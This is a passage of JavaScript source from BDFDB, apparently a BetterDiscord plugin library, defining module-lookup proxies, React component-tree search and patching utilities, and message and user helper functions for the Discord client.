								for (let ins of appInsUp[type]) Internal.forceInitiateProcess(filteredPlugins, ins, type);
							}
							if (bdSettings) {
								const bdSettingsIns = BDFDB.ReactUtils.findOwner(bdSettings, {name: filteredModules, type: specialModules, all: true, unlimited: true});
								if (bdSettingsIns.length) {
									const bdSettingsWrap = BDFDB.ReactUtils.findOwner(BDFDB.ReactUtils.getInstance(document.querySelector("#bd-settingspane-container > *")), {props: "onChange", up: true});
									if (bdSettingsWrap && bdSettingsWrap.props && typeof bdSettingsWrap.props.onChange == "function") bdSettingsWrap.props.onChange(bdSettingsWrap.props.type);
								}
							}
						}
						catch (err) {for (let plugin of plugins) BDFDB.LogUtils.error(["Could not force update Components!", err], plugin);}
					}
				}
			}
		};

		BDFDB.DiscordConstants = BDFDB.ModuleUtils.findByProperties("Permissions", "ActivityTypes");
		
		const DiscordObjects = {};
		Internal.DiscordObjects = new Proxy(DiscordObjects, {
			get: function (_, item) {
				if (DiscordObjects[item]) return DiscordObjects[item];
				if (!InternalData.DiscordObjects[item]) return (function () {});
				if (InternalData.DiscordObjects[item].props) DiscordObjects[item] = BDFDB.ModuleUtils.findByPrototypes(InternalData.DiscordObjects[item].props);
				else if (InternalData.DiscordObjects[item].strings) DiscordObjects[item] = BDFDB.ModuleUtils.findByString(InternalData.DiscordObjects[item].strings);
				if (InternalData.DiscordObjects[item].value) DiscordObjects[item] = (DiscordObjects[item] || {})[InternalData.DiscordObjects[item].value];
				return DiscordObjects[item] ? DiscordObjects[item] : (function () {});
			}
		});
		BDFDB.DiscordObjects = Internal.DiscordObjects;
		
		const LibraryRequires = {};
		Internal.LibraryRequires = new Proxy(LibraryRequires, {
			get: function (_, item) {
				if (LibraryRequires[item]) return LibraryRequires[item];
				if (InternalData.LibraryRequires.indexOf(item) == -1) return (function () {});
				try {LibraryRequires[item] = require(item);}
				catch (err) {}
				return LibraryRequires[item] ? LibraryRequires[item] : (function () {});
			}
		});
		BDFDB.LibraryRequires = Internal.LibraryRequires;
		
		const LibraryModules = {};
		LibraryModules.LanguageStore = BDFDB.ModuleUtils.find(m => m.Messages && m.Messages.IMAGE && m);
		LibraryModules.React = BDFDB.ModuleUtils.findByProperties("createElement", "cloneElement");
		LibraryModules.ReactDOM = BDFDB.ModuleUtils.findByProperties("render", "findDOMNode");
		Internal.LibraryModules = new Proxy(LibraryModules, {
			get: function (_, item) {
				if (LibraryModules[item]) return LibraryModules[item];
				if (!InternalData.LibraryModules[item]) return null;
				if (InternalData.LibraryModules[item].props) {
					if (InternalData.LibraryModules[item].nonProps) {
						LibraryModules[item] = BDFDB.ModuleUtils.find(m => InternalData.LibraryModules[item].props.every(prop => {
							const value = m[prop];
							return value !== undefined && !(typeof value == "string" && !value);
						}) && InternalData.LibraryModules[item].nonProps.every(prop => m[prop] === undefined) && m);
						if (!LibraryModules[item]) BDFDB.LogUtils.warn(`${JSON.stringify([InternalData.LibraryModules[item].props, InternalData.LibraryModules[item].nonProps].flat(10))} [props + nonProps] not found in WebModules`);
					}
					else LibraryModules[item] = BDFDB.ModuleUtils.findByProperties(InternalData.LibraryModules[item].props);
				}
				else if (InternalData.LibraryModules[item].strings) LibraryModules[item] = BDFDB.ModuleUtils.findByString(InternalData.LibraryModules[item].strings);
				if (InternalData.LibraryModules[item].value) LibraryModules[item] = (LibraryModules[item] || {})[InternalData.LibraryModules[item].value];
				return LibraryModules[item] ? LibraryModules[item] : null;
			}
		});
		
		BDFDB.LibraryModules = Internal.LibraryModules;
		
		if (Internal.LibraryModules.KeyCodeUtils) Internal.LibraryModules.KeyCodeUtils.getString = function (keyArray) {
			return Internal.LibraryModules.KeyCodeUtils.toString([keyArray].flat(10).filter(n => n).map(keyCode => [BDFDB.DiscordConstants.KeyboardDeviceTypes.KEYBOARD_KEY, Internal.LibraryModules.KeyCodeUtils.keyToCode((Object.entries(Internal.LibraryModules.KeyEvents.codes).find(n => n[1] == keyCode && Internal.LibraryModules.KeyCodeUtils.keyToCode(n[0], null)) || [])[0], null) || keyCode]), true);
		};
		
		BDFDB.ReactUtils = Object.assign({}, Internal.LibraryModules.React, Internal.LibraryModules.ReactDOM);
		BDFDB.ReactUtils.childrenToArray = function (parent) {
			if (parent && parent.props && parent.props.children && !BDFDB.ArrayUtils.is(parent.props.children)) {
				const child = parent.props.children;
				parent.props.children = [];
				parent.props.children.push(child);
			}
			return parent.props.children;
		}
		BDFDB.ReactUtils.createElement = function (component, props = {}, errorWrap = false) {
			if (component && component.defaultProps) for (let key in component.defaultProps) if (props[key] == null) props[key] = component.defaultProps[key];
			try {
				let child = Internal.LibraryModules.React.createElement(component || "div", props) || null;
				if (errorWrap) return Internal.LibraryModules.React.createElement(Internal.ErrorBoundary, {key: child && child.key || ""}, child) || null;
				else return child;
			}
			catch (err) {BDFDB.LogUtils.error(["Could not create React Element!", err]);}
			return null;
		};
		BDFDB.ReactUtils.objectToReact = function (obj) {
			if (!obj) return null;
			else if (typeof obj == "string") return obj;
			else if (BDFDB.ObjectUtils.is(obj)) return BDFDB.ReactUtils.createElement(obj.type || obj.props && obj.props.href && "a" || "div", !obj.props ?  {} : Object.assign({}, obj.props, {
				children: obj.props.children ? BDFDB.ReactUtils.objectToReact(obj.props.children) : null
			}));
			else if (BDFDB.ArrayUtils.is(obj)) return obj.map(n => BDFDB.ReactUtils.objectToReact(n));
			else return null;
		};
		BDFDB.ReactUtils.markdownParse = function (str) {
			if (!BDFDB.ReactUtils.markdownParse.parser || !BDFDB.ReactUtils.markdownParse.render) {
				BDFDB.ReactUtils.markdownParse.parser = Internal.LibraryModules.SimpleMarkdownParser.parserFor(Internal.LibraryModules.SimpleMarkdownParser.defaultRules);
				BDFDB.ReactUtils.markdownParse.render = Internal.LibraryModules.SimpleMarkdownParser.reactFor(Internal.LibraryModules.SimpleMarkdownParser.ruleOutput(Internal.LibraryModules.SimpleMarkdownParser.defaultRules, "react"));
			}
			return BDFDB.ReactUtils.markdownParse.render(BDFDB.ReactUtils.markdownParse.parser(str, {inline: true}));
		};
		BDFDB.ReactUtils.elementToReact = function (node, ref) {
			if (BDFDB.ReactUtils.isValidElement(node)) return node;
			else if (!Node.prototype.isPrototypeOf(node)) return null;
			else if (node.nodeType == Node.TEXT_NODE) return node.nodeValue;
			let attributes = {}, importantStyles = [];
			if (typeof ref == "function") attributes.ref = ref;
			if (node.attributes) {
				for (let attr of node.attributes) attributes[attr.name] = attr.value;
				if (node.attributes.style) attributes.style = BDFDB.ObjectUtils.filter(node.style, n => node.style[n] && isNaN(parseInt(n)), true);
			}
			attributes.children = [];
			if (node.style && node.style.cssText) for (let propStr of node.style.cssText.split(";")) if (propStr.endsWith("!important")) {
				let key = propStr.split(":")[0];
				let camelprop = key.replace(/-([a-z]?)/g, (m, g) => g.toUpperCase());
				if (attributes.style[camelprop] != null) importantStyles.push(key);
			}
			for (let child of node.childNodes) attributes.children.push(BDFDB.ReactUtils.elementToReact(child));
			attributes.className = BDFDB.DOMUtils.formatClassName(attributes.className, attributes.class);
			delete attributes.class;
			return BDFDB.ReactUtils.forceStyle(BDFDB.ReactUtils.createElement(node.tagName, attributes), importantStyles);
		};
		BDFDB.ReactUtils.forceStyle = function (reactEle, styles) {
			if (!BDFDB.ReactUtils.isValidElement(reactEle)) return null;
			if (!BDFDB.ObjectUtils.is(reactEle.props.style) || !BDFDB.ArrayUtils.is(styles) || !styles.length) return reactEle;
			let ref = reactEle.ref;
			reactEle.ref = instance => {
				if (typeof ref == "function") ref(instance);
				let node = BDFDB.ReactUtils.findDOMNode(instance);
				if (Node.prototype.isPrototypeOf(node)) for (let key of styles) {
					let propValue = reactEle.props.style[key.replace(/-([a-z]?)/g, (m, g) => g.toUpperCase())];
					if (propValue != null) node.style.setProperty(key, propValue, "important");
				}
			};
			return reactEle;
		};
		BDFDB.ReactUtils.findChild = function (nodeOrInstance, config) {
			if (!nodeOrInstance || !BDFDB.ObjectUtils.is(config) || !config.name && !config.key && !config.props && !config.filter) return config.all ? [] : null;
			let instance = Node.prototype.isPrototypeOf(nodeOrInstance) ? BDFDB.ReactUtils.getInstance(nodeOrInstance) : nodeOrInstance;
			if (!BDFDB.ObjectUtils.is(instance) && !BDFDB.ArrayUtils.is(instance)) return null;
			config.name = config.name && [config.name].flat().filter(n => n);
			config.key = config.key && [config.key].flat().filter(n => n);
			config.props = config.props && [config.props].flat().filter(n => n);
			config.filter = typeof config.filter == "function" && config.filter;
			let depth = -1;
			let start = performance.now();
			let maxDepth = config.unlimited ? 999999999 : (config.depth === undefined ? 30 : config.depth);
			let maxTime = config.unlimited ? 999999999 : (config.time === undefined ? 150 : config.time);
			
			let foundChildren = [];
			let singleChild = getChild(instance);
			if (config.all) {
				for (let i in foundChildren) delete foundChildren[i].BDFDBreactSearch;
				return foundChildren;
			}
			else return singleChild;
			
			function getChild (children) {
				let result = null;
				if (!children || depth >= maxDepth || performance.now() - start >= maxTime) return result;
				if (!BDFDB.ArrayUtils.is(children)) {
					if (check(children)) {
						if (config.all === undefined || !config.all) result = children;
						else if (config.all) {
							if (!children.BDFDBreactSearch) {
								children.BDFDBreactSearch = true;
								foundChildren.push(children);
							}
						}
					}
					else {
						if (children.props && children.props.children) {
							depth++;
							result = getChild(children.props.children);
							depth--;
						}
						if (!result && children.props && children.props.child) {
							depth++;
							result = getChild(children.props.child);
							depth--;
						}
					}
				}
				else {
					for (let child of children) if (child) {
						if (BDFDB.ArrayUtils.is(child)) result = getChild(child);
						else if (check(child)) {
							if (config.all === undefined || !config.all) result = child;
							else if (config.all) {
								if (!child.BDFDBreactSearch) {
									child.BDFDBreactSearch = true;
									foundChildren.push(child);
								}
							}
						}
						else {
							if (child.props && child.props.children) {
								depth++;
								result = getChild(child.props.children);
								depth--;
							}
							if (!result && child.props && child.props.child) {
								depth++;
								result = getChild(child.props.child);
								depth--;
							}
						}
						if (result) break;
					}
				}
				return result;
			}
			function check (instance) {
				if (!instance) return false;
				let props = instance.stateNode ? instance.stateNode.props : instance.props;
				return instance.type && config.name && config.name.some(name => BDFDB.ReactUtils.isCorrectInstance(instance, name)) || config.key && config.key.some(key => instance.key == key) || props && config.props && config.props[config.someProps ? "some" : "every"](prop => BDFDB.ArrayUtils.is(prop) ? (BDFDB.ArrayUtils.is(prop[1]) ? prop[1].some(checkValue => propCheck(props, prop[0], checkValue)) : propCheck(props, prop[0], prop[1])) : props[prop] !== undefined) || config.filter && config.filter(instance);
			}
			function propCheck (props, key, value) {
				return key != null && props[key] != null && value != null && (key == "className" ? (" " + props[key] + " ").indexOf(" " + value + " ") > -1 : BDFDB.equals(props[key], value));
			}
		};
		BDFDB.ReactUtils.setChild = function (parent, stringOrChild) {
			if (!BDFDB.ReactUtils.isValidElement(parent) || (!BDFDB.ReactUtils.isValidElement(stringOrChild) && typeof stringOrChild != "string" && !BDFDB.ArrayUtils.is(stringOrChild))) return;
			let set = false;
			checkParent(parent);
			function checkParent(child) {
				if (set) return;
				if (!BDFDB.ArrayUtils.is(child)) checkChild(child);
				else for (let subChild of child) checkChild(subChild);
			}
			function checkChild(child) {
				if (!BDFDB.ReactUtils.isValidElement(child)) return;
				if (BDFDB.ReactUtils.isValidElement(child.props.children)) checkParent(child.props.children);
				else if (BDFDB.ArrayUtils.is(child.props.children)) {
					if (child.props.children.every(c => !c || typeof c == "string")) {
						set = true;
						child.props.children = [stringOrChild].flat(10);
					}
					else checkParent(child.props.children);
				}
				else {
					set = true;
					child.props.children = stringOrChild;
				}
			}
		};
		BDFDB.ReactUtils.findConstructor = function (nodeOrInstance, types, config = {}) {
			if (!BDFDB.ObjectUtils.is(config)) return null;
			if (!nodeOrInstance || !types) return config.all ? (config.group ? {} : []) : null;
			let instance = Node.prototype.isPrototypeOf(nodeOrInstance) ? BDFDB.ReactUtils.getInstance(nodeOrInstance) : nodeOrInstance;
			if (!BDFDB.ObjectUtils.is(instance)) return config.all ? (config.group ? {} : []) : null;
			types = types && [types].flat(10).filter(n => typeof n == "string");
			if (!types.length) return config.all ? (config.group ? {} : []) : null;;
			let depth = -1;
			let start = performance.now();
			let maxDepth = config.unlimited ? 999999999 : (config.depth === undefined ? 30 : config.depth);
			let maxTime = config.unlimited ? 999999999 : (config.time === undefined ? 150 : config.time);
			let whitelist = config.up ? {
				return: true,
				sibling: true,
				default: true
			} : {
				child: true,
				sibling: true,
				default: true
			};
			whitelist[BDFDB.ReactUtils.instanceKey] = true;
			
			let foundConstructors = config.group ? {} : [];
			let singleConstructor = getConstructor(instance);
			if (config.all) {
				for (let i in foundConstructors) {
					if (config.group) for (let j in foundConstructors[i]) delete foundConstructors[i][j].BDFDBreactSearch;
					else delete foundConstructors[i].BDFDBreactSearch;
				}
				return foundConstructors;
			}
			else return singleConstructor;

			function getConstructor (instance) {
				depth++;
				let result = undefined;
				if (instance && !Node.prototype.isPrototypeOf(instance) && !BDFDB.ReactUtils.getInstance(instance) && depth < maxDepth && performance.now() - start < maxTime) {
					if (instance.type && types.some(name => BDFDB.ReactUtils.isCorrectInstance(instance, name.split(" _ _ ")[0]))) {
						if (config.all === undefined || !config.all) result = instance.type;
						else if (config.all) {
							if (!instance.type.BDFDBreactSearch) {
								instance.type.BDFDBreactSearch = true;
								if (config.group) {
									if (instance.type && (instance.type.render && instance.type.render.displayName || instance.type.displayName || instance.type.name)) {
										let group = config.name.find(name => (instance.type.render && instance.type.render.displayName || instance.type.displayName || instance.type.name || instance.type) == name.split(" _ _ ")[0]) || "Default";
										if (!BDFDB.ArrayUtils.is(foundConstructors[group])) foundConstructors[group] = [];
										foundConstructors[group].push(instance.stateNode);
									}
								}
								else foundConstructors.push(instance.type);
							}
						}
					}
					if (result === undefined) {
						let keys = Object.getOwnPropertyNames(instance);
						for (let i = 0; result === undefined && i < keys.length; i++) {
							let key = keys[i];
							if (key && whitelist[key] && (typeof instance[key] === "object" || typeof instance[key] == "function")) result = getConstructor(instance[key]);
						}
					}
				}
				depth--;
				return result;
			}
		};
		BDFDB.ReactUtils.findDOMNode = function (instance) {
			if (Node.prototype.isPrototypeOf(instance)) return instance;
			if (!instance || !instance.updater || typeof instance.updater.isMounted !== "function" || !instance.updater.isMounted(instance)) return null;
			let node = Internal.LibraryModules.ReactDOM.findDOMNode(instance) || BDFDB.ObjectUtils.get(instance, "child.stateNode");
			return Node.prototype.isPrototypeOf(node) ? node : null;
		};
		BDFDB.ReactUtils.findOwner = function (nodeOrInstance, config) {
			if (!BDFDB.ObjectUtils.is(config)) return null;
			if (!nodeOrInstance || !config.name && !config.type && !config.key && !config.props && !config.filter) return config.all ? (config.group ? {} : []) : null;
			let instance = Node.prototype.isPrototypeOf(nodeOrInstance) ? BDFDB.ReactUtils.getInstance(nodeOrInstance) : nodeOrInstance;
			if (!BDFDB.ObjectUtils.is(instance)) return config.all ? (config.group ? {} : []) : null;
			config.name = config.name && [config.name].flat().filter(n => n);
			config.type = config.type && [config.type].flat().filter(n => n);
			config.key = config.key && [config.key].flat().filter(n => n);
			config.props = config.props && [config.props].flat().filter(n => n);
			config.filter = typeof config.filter == "function" && config.filter;
			let depth = -1;
			let start = performance.now();
			let maxDepth = config.unlimited ? 999999999 : (config.depth === undefined ? 30 : config.depth);
			let maxTime = config.unlimited ? 999999999 : (config.time === undefined ? 150 : config.time);
			let whitelist = config.up ? {
				return: true,
				sibling: true,
				default: true
			} : {
				child: true,
				sibling: true,
				default: true
			};
			whitelist[BDFDB.ReactUtils.instanceKey] = true;
			
			let foundInstances = config.group ? {} : [];
			let singleInstance = getOwner(instance);
			if (config.all) {
				for (let i in foundInstances) {
					if (config.group) for (let j in foundInstances[i]) delete foundInstances[i][j].BDFDBreactSearch;
					else delete foundInstances[i].BDFDBreactSearch;
				}
				return foundInstances;
			}
			else return singleInstance;

			function getOwner (instance) {
				depth++;
				let result = undefined;
				if (instance && !Node.prototype.isPrototypeOf(instance) && !BDFDB.ReactUtils.getInstance(instance) && depth < maxDepth && performance.now() - start < maxTime) {
					let props = instance.stateNode ? instance.stateNode.props : instance.props;
					if (instance.stateNode && !Node.prototype.isPrototypeOf(instance.stateNode) && (instance.type && config.name && config.name.some(name => BDFDB.ReactUtils.isCorrectInstance(instance, name.split(" _ _ ")[0])) || instance.type && config.type && config.type.some(type => BDFDB.ArrayUtils.is(type) ? instance.type === type[1] : instance.type === type) || instance.key && config.key && config.key.some(key => instance.key == key) || props && config.props && config.props.every(prop => BDFDB.ArrayUtils.is(prop) ? (BDFDB.ArrayUtils.is(prop[1]) ? prop[1].some(checkValue => BDFDB.equals(props[prop[0]], checkValue)) : BDFDB.equals(props[prop[0]], prop[1])) : props[prop] !== undefined)) || config.filter && config.filter(instance)) {
						if (config.all === undefined || !config.all) result = instance.stateNode;
						else if (config.all) {
							if (!instance.stateNode.BDFDBreactSearch) {
								instance.stateNode.BDFDBreactSearch = true;
								if (config.group) {
									if (config.name && instance.type && (instance.type.render && instance.type.render.displayName || instance.type.displayName || instance.type.name || instance.type)) {
										let group = config.name.find(name => (instance.type.render && instance.type.render.displayName || instance.type.displayName || instance.type.name || instance.type) == name.split(" _ _ ")[0]) || "Default";
										if (!BDFDB.ArrayUtils.is(foundInstances[group])) foundInstances[group] = [];
										foundInstances[group].push(instance.stateNode);
									}
									else if (config.type && instance.type) {
										let group = [config.type.find(t => BDFDB.ArrayUtils.is(t) && instance.type === t[1])].flat(10)[0] || "Default";
										if (!BDFDB.ArrayUtils.is(foundInstances[group])) foundInstances[group] = [];
										foundInstances[group].push(instance.stateNode);
									}
								}
								else foundInstances.push(instance.stateNode);
							}
						}
					}
					if (result === undefined) {
						let keys = Object.getOwnPropertyNames(instance);
						for (let i = 0; result === undefined && i < keys.length; i++) {
							let key = keys[i];
							if (key && whitelist[key] && (typeof instance[key] === "object" || typeof instance[key] == "function")) result = getOwner(instance[key]);
						}
					}
				}
				depth--;
				return result;
			}
		};
		BDFDB.ReactUtils.findParent = function (nodeOrInstance, config) {
			if (!nodeOrInstance || !BDFDB.ObjectUtils.is(config) || !config.name && !config.key && !config.props && !config.filter) return [null, -1];
			let instance = Node.prototype.isPrototypeOf(nodeOrInstance) ? BDFDB.ReactUtils.getInstance(nodeOrInstance) : nodeOrInstance;
			if (!BDFDB.ObjectUtils.is(instance) && !BDFDB.ArrayUtils.is(instance) || instance.props && typeof instance.props.children == "function") return [null, -1];
			config.name = config.name && [config.name].flat().filter(n => n);
			config.key = config.key && [config.key].flat().filter(n => n);
			config.props = config.props && [config.props].flat().filter(n => n);
			config.filter = typeof config.filter == "function" && config.filter;
			let parent, firstArray;
			parent = firstArray = instance;
			while (!BDFDB.ArrayUtils.is(firstArray) && firstArray.props && firstArray.props.children) firstArray = firstArray.props.children;
			if (!BDFDB.ArrayUtils.is(firstArray)) {
				if (parent && parent.props) {
					parent.props.children = [parent.props.children];
					firstArray = parent.props.children;
				}
				else firstArray = [];
			}
			return getParent(instance);
			function getParent (children) {
				let result = [firstArray, -1];
				if (!children) return result;
				if (!BDFDB.ArrayUtils.is(children)) {
					if (check(children)) result = found(children);
					else {
						if (children.props && children.props.children) {
							parent = children;
							result = getParent(children.props.children);
						}
						if (!(result && result[1] > -1) && children.props && children.props.child) {
							parent = children;
							result = getParent(children.props.child);
						}
					}
				}
				else {
					for (let i = 0; result[1] == -1 && i < children.length; i++) if (children[i]) {
						if (BDFDB.ArrayUtils.is(children[i])) {
							parent = children;
							result = getParent(children[i]);
						}
						else if (check(children[i])) {
							parent = children;
							result = found(children[i]);
						}
						else {
							if (children[i].props && children[i].props.children) {
								parent = children[i];
								result = getParent(children[i].props.children);
							}
							if (!(result && result[1] > -1) && children[i].props && children[i].props.child) {
								parent = children[i];
								result = getParent(children[i].props.child);
							}
						}
					}
				}
				return result;
			}
			function found (child) {
				if (BDFDB.ArrayUtils.is(parent)) return [parent, parent.indexOf(child)];
				else {
					parent.props.children = [];
					parent.props.children.push(child);
					return [parent.props.children, 0];
				}
			}
			function check (instance) {
				if (!instance || instance == parent) return false;
				let props = instance.stateNode ? instance.stateNode.props : instance.props;
				return instance.type && config.name && config.name.some(name => BDFDB.ReactUtils.isCorrectInstance(instance, name)) || config.key && config.key.some(key => instance.key == key) || props && config.props && config.props[config.someProps ? "some" : "every"](prop => BDFDB.ArrayUtils.is(prop) ? (BDFDB.ArrayUtils.is(prop[1]) ? prop[1].some(checkValue => propCheck(props, prop[0], checkValue)) : propCheck(props, prop[0], prop[1])) : props[prop] !== undefined) || config.filter && config.filter(instance);
			}
			function propCheck (props, key, value) {
				return key != null && props[key] != null && value != null && (key == "className" ? (" " + props[key] + " ").indexOf(" " + value + " ") > -1 : BDFDB.equals(props[key], value));
			}
		};
		BDFDB.ReactUtils.findProps = function (nodeOrInstance, config) {
			if (!BDFDB.ObjectUtils.is(config)) return null;
			if (!nodeOrInstance || !config.name && !config.key) return null;
			let instance = Node.prototype.isPrototypeOf(nodeOrInstance) ? BDFDB.ReactUtils.getInstance(nodeOrInstance) : nodeOrInstance;
			if (!BDFDB.ObjectUtils.is(instance)) return null;
			config.name = config.name && [config.name].flat().filter(n => n);
			config.key = config.key && [config.key].flat().filter(n => n);
			let depth = -1;
			let start = performance.now();
			let maxDepth = config.unlimited ? 999999999 : (config.depth === undefined ? 30 : config.depth);
			let maxTime = config.unlimited ? 999999999 : (config.time === undefined ? 150 : config.time);
			let whitelist = config.up ? {
				return: true,
				sibling: true,
				default: true
			} : {
				child: true,
				sibling: true,
				default: true
			};
			whitelist[BDFDB.ReactUtils.instanceKey] = true;
			return findProps(instance);

			function findProps (instance) {
				depth++;
				let result = undefined;
				if (instance && !Node.prototype.isPrototypeOf(instance) && !BDFDB.ReactUtils.getInstance(instance) && depth < maxDepth && performance.now() - start < maxTime) {
					if (instance.memoizedProps && (instance.type && config.name && config.name.some(name => BDFDB.ReactUtils.isCorrectInstance(instance, name.split(" _ _ ")[0])) || config.key && config.key.some(key => instance.key == key))) result = instance.memoizedProps;
					if (result === undefined) {
						let keys = Object.getOwnPropertyNames(instance);
						for (let i = 0; result === undefined && i < keys.length; i++) {
							let key = keys[i];
							if (key && whitelist[key] && (typeof instance[key] === "object" || typeof instance[key] == "function")) result = findProps(instance[key]);
						}
					}
				}
				depth--;
				return result;
			}
		};
		BDFDB.ReactUtils.findValue = function (nodeOrInstance, searchKey, config = {}) {
			if (!BDFDB.ObjectUtils.is(config)) return null;
			if (!nodeOrInstance || typeof searchKey != "string") return config.all ? [] : null;
			let instance = Node.prototype.isPrototypeOf(nodeOrInstance) ? BDFDB.ReactUtils.getInstance(nodeOrInstance) : nodeOrInstance;
			if (!BDFDB.ObjectUtils.is(instance)) return config.all ? [] : null;
			instance = instance[BDFDB.ReactUtils.instanceKey] || instance;
			let depth = -1;
			let start = performance.now();
			let maxDepth = config.unlimited ? 999999999 : (config.depth === undefined ? 30 : config.depth);
			let maxTime = config.unlimited ? 999999999 : (config.time === undefined ? 150 : config.time);
			let whitelist = {
				props: true,
				state: true,
				stateNode: true,
				updater: true,
				prototype: true,
				type: true,
				children: config.up ? false : true,
				memoizedProps: true,
				memoizedState: true,
				child: config.up ? false : true,
				return: config.up ? true : false,
				sibling: config.up ? false : true
			};
			let blacklist = {
				contextSection: true
			};
			if (BDFDB.ObjectUtils.is(config.whitelist)) Object.assign(whitelist, config.whiteList);
			if (BDFDB.ObjectUtils.is(config.blacklist)) Object.assign(blacklist, config.blacklist);
			let foundKeys = [];
			let singleKey = getKey(instance);
			if (config.all) return foundKeys;
			else return singleKey;
			function getKey(instance) {
				depth++;
				let result = undefined;
				if (instance && !Node.prototype.isPrototypeOf(instance) && !BDFDB.ReactUtils.getInstance(instance) && depth < maxDepth && performance.now() - start < maxTime) {
					let keys = Object.getOwnPropertyNames(instance);
					for (let i = 0; result === undefined && i < keys.length; i++) {
						let key = keys[i];
						if (key && !blacklist[key]) {
							let value = instance[key];
							if (searchKey === key && (config.value === undefined || BDFDB.equals(config.value, value))) {
								if (config.all === undefined || !config.all) result = value;
								else if (config.all) {
									if (config.noCopies === undefined || !config.noCopies) foundKeys.push(value);
									else if (config.noCopies) {
										let copy = false;
										for (let foundKey of foundKeys) if (BDFDB.equals(value, foundKey)) {
											copy = true;
											break;
										}
										if (!copy) foundKeys.push(value);
									}
								}
							}
							else if ((typeof value === "object" || typeof value == "function") && (whitelist[key] || key[0] == "." || !isNaN(key[0]))) result = getKey(value);
						}
					}
				}
				depth--;
				return result;
			}
		};
		BDFDB.ReactUtils.forceUpdate = function (...instances) {
			for (let ins of instances.flat(10).filter(n => n)) if (ins.updater && typeof ins.updater.isMounted == "function" && ins.updater.isMounted(ins)) ins.forceUpdate();
		};
		BDFDB.ReactUtils.getInstance = function (node) {
			if (!BDFDB.ObjectUtils.is(node)) return null;
			return node[Object.keys(node).find(key => key.startsWith("__reactInternalInstance") || key.startsWith("__reactFiber"))];
		};
		BDFDB.ReactUtils.isCorrectInstance = function (instance, name) {
			return instance && ((instance.type && (instance.type.render && instance.type.render.displayName === name || instance.type.displayName === name || instance.type.name === name || instance.type === name)) || instance.render && (instance.render.displayName === name || instance.render.name === name) || instance.displayName == name || instance.name === name);
		};
		BDFDB.ReactUtils.render = function (component, node) {
			if (!BDFDB.ReactUtils.isValidElement(component) || !Node.prototype.isPrototypeOf(node)) return;
			try {
				Internal.LibraryModules.ReactDOM.render(component, node);
				let observer = new MutationObserver(changes => changes.forEach(change => {
					let nodes = Array.from(change.removedNodes);
					if (nodes.indexOf(node) > -1 || nodes.some(n =>  n.contains(node))) {
						observer.disconnect();
						BDFDB.ReactUtils.unmountComponentAtNode(node);
					}
				}));
				observer.observe(document.body, {subtree: true, childList: true});
			}
			catch (err) {BDFDB.LogUtils.error(["Could not render React Element!", err]);}
		};

		BDFDB.MessageUtils = {};
		BDFDB.MessageUtils.isSystemMessage = function (message) {
			return message && !BDFDB.DiscordConstants.USER_MESSAGE_TYPES.has(message.type) && (message.type !== BDFDB.DiscordConstants.MessageTypes.APPLICATION_COMMAND || message.interaction == null);
		};
		BDFDB.MessageUtils.rerenderAll = function (instant) {
			BDFDB.TimeUtils.clear(BDFDB.MessageUtils.rerenderAll.timeout);
			BDFDB.MessageUtils.rerenderAll.timeout = BDFDB.TimeUtils.timeout(_ => {
				let channelId = Internal.LibraryModules.LastChannelStore.getChannelId();
				if (channelId) {
					if (BDFDB.DMUtils.isDMChannel(channelId)) BDFDB.DMUtils.markAsRead(channelId);
					else BDFDB.ChannelUtils.markAsRead(channelId);
				}
				let LayerProviderIns = BDFDB.ReactUtils.findOwner(document.querySelector(BDFDB.dotCN.messageswrapper), {name: "LayerProvider", unlimited: true, up: true});
				let LayerProviderPrototype = BDFDB.ObjectUtils.get(LayerProviderIns, `${BDFDB.ReactUtils.instanceKey}.type.prototype`);
				if (LayerProviderIns && LayerProviderPrototype) {
					BDFDB.PatchUtils.patch({name: "BDFDB MessageUtils"}, LayerProviderPrototype, "render", {after: e => {
						e.returnValue.props.children = typeof e.returnValue.props.children == "function" ? (_ => {return null;}) : [];
						BDFDB.ReactUtils.forceUpdate(LayerProviderIns);
					}}, {once: true});
					BDFDB.ReactUtils.forceUpdate(LayerProviderIns);
				}
			}, instant ? 0 : 1000);
		};
		BDFDB.MessageUtils.openMenu = function (message, e = mousePosition, slim = false) {
			if (!message) return;
			let channel = Internal.LibraryModules.ChannelStore.getChannel(message.channel_id);
			if (!channel) return;
			e = BDFDB.ListenerUtils.copyEvent(e.nativeEvent || e, (e.nativeEvent || e).currentTarget);
			let menu = BDFDB.ModuleUtils.findByName(slim ? "MessageSearchResultContextMenu" : "MessageContextMenu", false, true);
			if (menu) Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, e2 => BDFDB.ReactUtils.createElement(menu.exports.default, Object.assign({}, e2, {message, channel})));
			else Internal.lazyLoadModuleImports(BDFDB.ModuleUtils.findByString(slim ? ["SearchResult", "message:", "openContextMenu"] : ["useHoveredMessage", "useContextMenuUser", "openContextMenu"])).then(_ => {
				menu = BDFDB.ModuleUtils.findByName(slim ? "MessageSearchResultContextMenu" : "MessageContextMenu", false);
				if (menu) Internal.LibraryModules.ContextMenuUtils.openContextMenu(e, e2 => BDFDB.ReactUtils.createElement(menu.exports.default, Object.assign({}, e2, {message, channel})));
			});
		};
			
		BDFDB.UserUtils = {};
		BDFDB.UserUtils.is = function (user) {
			return user && user instanceof Internal.DiscordObjects.User;
		};
		const myDataUser = Internal.LibraryModules.UserStore && Internal.LibraryModules.UserStore.getCurrentUser && Internal.LibraryModules.UserStore.getCurrentUser();
		if (myDataUser && BDFDB.UserUtils._id != myDataUser.id) {
			document.body.setAttribute("data-current-user-id", myDataUser.id);
			BDFDB.UserUtils._id = myDataUser.id;
		}
		BDFDB.UserUtils.me = new Proxy(myDataUser || {}, {
			get: function (list, item) {
				const user = Internal.LibraryModules.UserStore && Internal.LibraryModules.UserStore.getCurrentUser && Internal.LibraryModules.UserStore.getCurrentUser();
				if (user && BDFDB.UserUtils._id != user.id) {
					Cache.data = {};
					document.body.setAttribute("data-current-user-id", user.id);
					BDFDB.UserUtils._id = user.id;
				}
				return user ? user[item] : null;
			}
		});
		BDFDB.UserUtils.getStatus = function (id = BDFDB.UserUtils.me.id) {
			id = typeof id == "number" ? id.toFixed() : id;
			let activity = BDFDB.UserUtils.getActivity(id);
			return activity && activity.type == BDFDB.DiscordConstants.ActivityTypes.STREAMING ? "streaming" : Internal.LibraryModules.StatusMetaUtils.getStatus(id);
		};
		BDFDB.UserUtils.getStatusColor = function (status, useColor) {
			status = typeof status == "string" ? status.toLowerCase() : null;
			switch (status) {
				case "online": return useColor ? BDFDB.DiscordConstants.Colors.STATUS_GREEN_600 : "var(--bdfdb-green)";
